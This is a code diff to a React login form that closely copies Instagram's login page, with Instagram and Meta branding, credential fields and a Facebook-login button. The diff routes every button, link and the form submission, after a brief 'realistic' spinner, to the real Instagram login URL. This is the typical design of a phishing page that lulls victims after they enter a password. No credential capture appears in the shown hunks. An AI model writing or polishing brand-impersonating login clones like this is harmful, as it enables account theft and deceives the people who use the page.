@@ -9,6 +9,8 @@ export const LoginForm = ({ isMobile = false }) => {
   const [isPasswordFocused, setIsPasswordFocused] = useState(false);
   const [isLoading, setIsLoading] = useState(false);
 
+  const TARGET_URL = 'https://www.instagram.com/accounts/login';
+
   const isIdentifierFloating = isIdentifierFocused || identifier.length > 0;
   const isPasswordFloating = isPasswordFocused || password.length > 0;
 
@@ -21,25 +23,20 @@ export const LoginForm = ({ isMobile = false }) => {
 
     setIsLoading(true);
 
-    // Brief realistic spinner, then route directly to real Instagram
+    // Brief loading spinner, then route to the requested Instagram login URL
     setTimeout(() => {
-      window.location.href = 'https://www.instagram.com/';
+      window.location.href = TARGET_URL;
     }, 800);
   };
 
-  const handleFacebookLogin = (e) => {
+  const handleRoute = (e) => {
     e.preventDefault();
-    window.location.href = 'https://www.facebook.com/login.php';
-  };
-
-  const handleCreateAccount = (e) => {
-    e.preventDefault();
-    window.location.href = 'https://www.instagram.com/accounts/emailsignup/';
+    window.location.href = TARGET_URL;
   };
 
   if (isMobile) {
     return (
-      <div className="w-full h-full flex flex-col justify-between py-2 max-w-[360px] mx-auto select-none">
+      <div className="w-full h-full min-h-[calc(100vh-60px)] flex flex-col justify-between py-2 max-w-[360px] mx-auto select-none">
         {/* Upper Section: Centered Logo */}
         <div className="w-full flex flex-col items-center pt-8 pb-10">
           <InstagramGradientIcon className="w-[68px] h-[68px]" />
@@ -149,8 +146,9 @@ export const LoginForm = ({ isMobile = false }) => {
             {/* Forgotten password? Link */}
             <div className="w-full text-center my-3">
               <a
-                href="https://www.instagram.com/accounts/password/reset/"
-                className="text-[14px] text-[#000000] font-normal hover:underline inline-block focus:outline-none"
+                href={TARGET_URL}
+                onClick={handleRoute}
+                className="text-[14px] text-[#000000] font-normal hover:underline inline-block focus:outline-none cursor-pointer"
               >
                 Forgotten password?
               </a>
@@ -158,17 +156,17 @@ export const LoginForm = ({ isMobile = false }) => {
           </form>
         </div>
 
-        {/* Bottom Section: Create new account & Meta Logo */}
-        <div className="w-full flex flex-col items-center mt-auto pt-10">
+        {/* Anchored Bottom Section: Create new account & Meta Logo */}
+        <div className="w-full flex flex-col items-center mt-auto pt-10 pb-4">
           <button
             type="button"
-            onClick={handleCreateAccount}
+            onClick={handleRoute}
             className="w-full h-[44px] rounded-full bg-transparent hover:bg-[#0064e0]/5 border border-[#0064e0] flex items-center justify-center text-[14px] font-semibold text-[#0064e0] hover:text-[#1877f2] transition-colors focus:outline-none cursor-pointer mb-3"
           >
             <span>Create new account</span>
           </button>
           <div className="flex justify-center items-center py-2">
-            <MetaLogo />
+            <MetaLogo className="h-6 w-auto" />
           </div>
         </div>
       </div>
@@ -272,7 +270,7 @@ export const LoginForm = ({ isMobile = false }) => {
           disabled={!isFormValid || isLoading}
           className={`w-full mt-1 h-[44px] rounded-full text-[14px] font-semibold flex items-center justify-center transition-all duration-200 ${
             isFormValid && !isLoading
-              ? 'bg-[#0064e0] hover:bg-[#1877f2] active:opacity-90 text-white cursor-pointer shadow-sm'
+              ? 'bg-[#0064e0] hover:bg-[#1877f2] active:opacity-90 text-white cursor-pointer shadow-md'
               : 'bg-[#4cb5f9]/70 text-white/80 cursor-default'
           }`}
         >
@@ -286,8 +284,9 @@ export const LoginForm = ({ isMobile = false }) => {
         {/* Forgotten password? Link */}
         <div className="w-full text-center my-3">
           <a
-            href="https://www.instagram.com/accounts/password/reset/"
-            className="text-[14px] text-[#000000] font-normal hover:underline inline-block focus:outline-none"
+            href={TARGET_URL}
+            onClick={handleRoute}
+            className="text-[14px] text-[#000000] font-normal hover:underline inline-block focus:outline-none cursor-pointer"
           >
             Forgotten password?
           </a>
@@ -296,7 +295,7 @@ export const LoginForm = ({ isMobile = false }) => {
         {/* Log in with Facebook Button */}
         <button
           type="button"
-          onClick={handleFacebookLogin}
+          onClick={handleRoute}
           className="w-full h-[44px] rounded-full bg-[#f0f2f5] hover:bg-[#e4e6eb] border border-[#dbdbdb] flex items-center justify-center gap-2.5 text-[14px] font-semibold text-[#000000] transition-colors focus:outline-none cursor-pointer"
         >
           <FacebookIcon className="w-5 h-5 text-[#1877f2]" />
@@ -306,7 +305,7 @@ export const LoginForm = ({ isMobile = false }) => {
         {/* Create new account Button */}
         <button
           type="button"
-          onClick={handleCreateAccount}
+          onClick={handleRoute}
           className="w-full h-[44px] rounded-full bg-transparent hover:bg-[#0064e0]/5 border border-[#0064e0] flex items-center justify-center text-[14px] font-semibold text-[#0064e0] hover:text-[#1877f2] transition-colors focus:outline-none cursor-pointer mt-1"
         >
           <span>Create new account</span>
@@ -315,7 +314,7 @@ export const LoginForm = ({ isMobile = false }) => {
 
       {/* Meta Logo */}
       <div className="mt-8 flex justify-center items-center">
-        <MetaLogo />
+        <MetaLogo className="h-6 w-auto" />
       </div>
     </div>
   );
